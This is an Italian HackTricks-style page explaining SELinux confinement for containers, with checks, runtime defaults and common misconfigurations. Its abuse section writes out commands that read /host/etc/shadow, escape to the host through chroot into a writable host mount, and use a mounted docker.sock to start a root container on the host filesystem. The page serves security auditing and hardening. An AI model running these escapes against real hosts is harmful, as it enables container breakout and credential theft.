# SELinux

{{#include ../../../../banners/hacktricks-training.md}}

## Panoramica

SELinux è un **sistema di controllo degli accessi obbligatorio basato su etichette**. Ogni processo e oggetto rilevante può avere un contesto di sicurezza, e la policy decide quali domini possono interagire con quali tipi e in che modo. Negli ambienti containerizzati, questo di solito significa che il runtime avvia il processo del container in un dominio container confinato e etichetta il contenuto del container con i tipi corrispondenti. Se la policy funziona correttamente, il processo può leggere e scrivere le risorse che la sua etichetta dovrebbe poter toccare, mentre gli viene negato l'accesso ad altri contenuti dell'host, anche se tali contenuti diventano visibili tramite un mount.

Questa è una delle protezioni lato host più potenti disponibili nelle principali distribuzioni Linux con container. È particolarmente importante su Fedora, RHEL, CentOS Stream, OpenShift e altri ecosistemi incentrati su SELinux. In quegli ambienti, un revisore che ignora SELinux spesso fraintende perché un percorso che sembra ovvio per compromettere l'host sia in realtà bloccato.

## AppArmor Vs SELinux

La differenza più semplice da capire a livello alto è che AppArmor è basato sui percorsi mentre SELinux è **basato su etichette**. Questo ha grandi conseguenze per la sicurezza dei container. Una policy basata sui percorsi può comportarsi in modo diverso se lo stesso contenuto dell'host diventa visibile sotto un percorso di mount inaspettato. Una policy basata su etichette invece considera quale sia l'etichetta dell'oggetto e cosa il dominio del processo può farci. Questo non rende SELinux semplice, ma lo rende robusto contro una classe di assunzioni legate ai trucchi sui percorsi che i difensori a volte fanno accidentalmente nei sistemi basati su AppArmor.

Poiché il modello è orientato alle etichette, la gestione dei volumi del container e le decisioni di relabeling sono critiche per la sicurezza. Se il runtime o l'operatore modificano le etichette in modo troppo esteso per "far funzionare i mount", il confine della policy che doveva contenere il workload può diventare molto più debole del previsto.

## Laboratorio

Per verificare se SELinux è attivo sull'host:
```bash
getenforce 2>/dev/null
sestatus 2>/dev/null
```
Per ispezionare le etichette esistenti sull'host:
```bash
ps -eZ | head
ls -Zd /var/lib/containers 2>/dev/null
ls -Zd /var/lib/docker 2>/dev/null
```
Per confrontare un'esecuzione normale con una in cui l'etichettatura è disabilitata:
```bash
podman run --rm fedora cat /proc/self/attr/current
podman run --rm --security-opt label=disable fedora cat /proc/self/attr/current
```
Su un host con SELinux abilitato, questa è una dimostrazione molto pratica perché mostra la differenza tra un workload che esegue sotto il dominio container previsto e uno a cui è stato tolto quello strato di applicazione.

## Uso a runtime

Podman è particolarmente ben integrato con SELinux sui sistemi in cui SELinux fa parte delle impostazioni di default della piattaforma. Rootless Podman insieme a SELinux rappresenta una delle baseline container mainstream più robuste perché il processo è già privo di privilegi sul lato host ed è comunque confinato da MAC policy. Docker può usare SELinux dove è supportato, anche se gli amministratori a volte lo disabilitano per aggirare la frizione dell'etichettatura dei volumi. CRI-O e OpenShift fanno ampio uso di SELinux come parte della loro strategia di isolamento dei container. Kubernetes può esporre impostazioni correlate a SELinux, ma il loro valore ovviamente dipende dal fatto che il sistema operativo del nodo supporti ed applichi effettivamente SELinux.

La lezione ricorrente è che SELinux non è un contorno opzionale. Negli ecosistemi costruiti intorno a esso, fa parte del confine di sicurezza atteso.

## Misconfigurazioni

L'errore classico è `label=disable`. Operativamente, questo accade spesso perché un mount di volume è stato negato e la soluzione temporanea più rapida è stata togliere SELinux dall'equazione invece di correggere il modello di etichettatura. Un altro errore comune è la riletichettatura errata del contenuto dell'host. Operazioni di riletichettatura ampie possono far funzionare l'applicazione, ma possono anche ampliare ciò che il container è autorizzato a toccare ben oltre quanto originariamente inteso.

È anche importante non confondere **SELinux installato** con **SELinux effettivo**. Un host può supportare SELinux e trovarsi comunque in modalità permissiva, oppure il runtime potrebbe non lanciare il workload sotto il dominio previsto. In quei casi la protezione è molto più debole di quanto la documentazione potrebbe suggerire.

## Abuso

Quando SELinux è assente, in modalità permissiva o ampiamente disabilitato per il workload, i percorsi montati dall'host diventano molto più facili da abusare. Lo stesso bind mount che altrimenti sarebbe stato vincolato dalle etichette può diventare una via diretta ai dati dell'host o alla modifica dell'host. Questo è particolarmente rilevante quando si combina con mount di volumi scrivibili, directory del runtime del container o scorciatoie operative che espongono percorsi sensibili dell'host per comodità.

SELinux spesso spiega perché una writeup di breakout generico funziona immediatamente su un host ma fallisce ripetutamente su un altro anche se i flag del runtime sembrano simili. L'ingrediente mancante non è di frequente un namespace o una capability, bensì un confine di etichette che è rimasto intatto.

Il controllo pratico più veloce è confrontare il contesto attivo e poi sondare i percorsi montati dell'host o le directory di runtime che normalmente sarebbero confinate dalle etichette:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
find / -maxdepth 3 -name '*.sock' 2>/dev/null | grep -E 'docker|containerd|crio'
find /host -maxdepth 2 -ls 2>/dev/null | head
```
Se è presente un bind mount dell'host e l'etichettatura di SELinux è stata disabilitata o indebolita, spesso si verifica prima un'esposizione di informazioni:
```bash
ls -la /host/etc 2>/dev/null | head
cat /host/etc/passwd 2>/dev/null | head
cat /host/etc/shadow 2>/dev/null | head
```
Se il mount è scrivibile e il container è effettivamente host-root dal punto di vista del kernel, il passo successivo è testare una modifica controllata dell'host invece di indovinare:
```bash
touch /host/tmp/selinux_test 2>/dev/null && echo "host write works"
ls -l /host/tmp/selinux_test 2>/dev/null
```
Su host con SELinux abilitato, la perdita delle etichette nelle directory di stato runtime può anche esporre percorsi diretti di privilege-escalation:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host/var/lib -maxdepth 3 \( -name docker -o -name containers -o -name containerd \) 2>/dev/null
```
Questi comandi non sostituiscono una full escape chain, ma chiariscono molto rapidamente se SELinux era ciò che impediva l'accesso ai dati dell'host o la modifica dei file sul lato host.

### Esempio completo: SELinux disabilitato + Writable Host Mount

Se la labeling di SELinux è disabilitata e il filesystem dell'host è montato in scrittura su `/host`, una full host escape diventa un normale caso di abuso di bind-mount:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
touch /host/tmp/selinux_escape_test
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Se il `chroot` ha successo, il processo del container ora opera sul filesystem dell'host:
```bash
id
hostname
cat /etc/passwd | tail
```
### Esempio completo: SELinux Disabled + Runtime Directory

Se il workload può raggiungere un runtime socket una volta che le labels sono disabilitate, l'escape può essere delegato al runtime:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
```
L'osservazione rilevante è che SELinux spesso costituiva il controllo che impediva esattamente questo tipo di accesso host-path o runtime-state.

## Checks

L'obiettivo dei controlli SELinux è confermare che SELinux sia abilitato, identificare l'attuale contesto di sicurezza e verificare se i file o i percorsi di interesse siano effettivamente confinati tramite etichette.
```bash
getenforce                              # Enforcing / Permissive / Disabled
ps -eZ | grep -i container              # Process labels for container-related processes
ls -Z /path/of/interest                 # File or directory labels on sensitive paths
cat /proc/self/attr/current             # Current process security context
```
What is interesting here:

- `getenforce` dovrebbe idealmente restituire `Enforcing`; `Permissive` o `Disabled` cambiano il significato dell'intera sezione SELinux.
- Se il contesto del processo corrente appare inaspettato o troppo ampio, il workload potrebbe non essere eseguito sotto la policy di container prevista.
- Se i file montati dall'host o le directory di runtime hanno label che il processo può accedere troppo liberamente, i bind mounts diventano molto più pericolosi.

Quando si esamina un container su una piattaforma con SELinux abilitato, non considerare l'etichettatura come un dettaglio secondario. In molti casi è una delle ragioni principali per cui l'host non è già compromesso.

## Impostazioni predefinite del runtime

| Runtime / platform | Stato predefinito | Comportamento predefinito | Indebolimenti manuali comuni |
| --- | --- | --- | --- |
| Docker Engine | Dipende dall'host | La separazione SELinux è disponibile sugli host abilitati a SELinux, ma il comportamento preciso dipende dalla configurazione dell'host/daemon | `--security-opt label=disable`, ampia rilabelizzazione dei bind mounts, `--privileged` |
| Podman | Comunemente abilitato sugli host con SELinux | La separazione SELinux è una parte normale di Podman sui sistemi SELinux a meno che non sia disabilitata | `--security-opt label=disable`, `label=false` in `containers.conf`, `--privileged` |
| Kubernetes | Non assegnato automaticamente a livello di Pod in generale | Esiste supporto SELinux, ma i Pod di solito necessitano di `securityContext.seLinuxOptions` o di default specifici della piattaforma; sono richiesti il runtime e il supporto del nodo | opzioni `seLinuxOptions` deboli o troppo ampie, esecuzione su nodi permissive/disabled, politiche di piattaforma che disabilitano l'etichettatura |
| CRI-O / OpenShift style deployments | Spesso considerato fondamentale | SELinux è spesso una parte centrale del modello di isolamento dei nodi in questi ambienti | policy personalizzate che ampliano eccessivamente gli accessi, disabilitazione dell'etichettatura per compatibilità |

I default di SELinux dipendono più dalla distribuzione rispetto ai default di seccomp. Su sistemi in stile Fedora/RHEL/OpenShift, SELinux è spesso centrale nel modello di isolamento. Su sistemi non-SELinux, è semplicemente assente.
